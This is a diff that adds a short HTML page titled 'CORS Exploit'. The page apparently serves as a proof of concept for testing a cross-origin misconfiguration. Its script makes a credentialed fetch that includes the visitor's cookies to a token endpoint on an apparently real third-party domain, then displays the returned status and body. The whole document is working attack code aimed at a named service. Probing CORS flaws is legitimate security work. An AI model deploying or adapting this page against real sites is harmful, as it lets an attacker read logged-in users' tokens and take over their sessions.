@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit</title>
+</head>
+<body>
+  <h1>Testing CORS</h1>
+  <pre id="result">Waiting...</pre>
+  <script>
+    fetch("https://a.sensfrx.ai/v1/token/6975956592814677", {
+      method: "GET",
+      credentials: "include" // CRITICAL: includes cookies!
+    })
+    .then(res => {
+      document.getElementById("result").textContent = `Status: ${res.status}`;
+      return res.text();
+    })
+    .then(body => {
+      document.getElementById("result").textContent += `\n\nResponse:\n${body}`;
+    })
+    .catch(err => {
+      document.getElementById("result").textContent += `\n\nError: ${err}`;
+    });
+  </script>
+</body>
+</html>
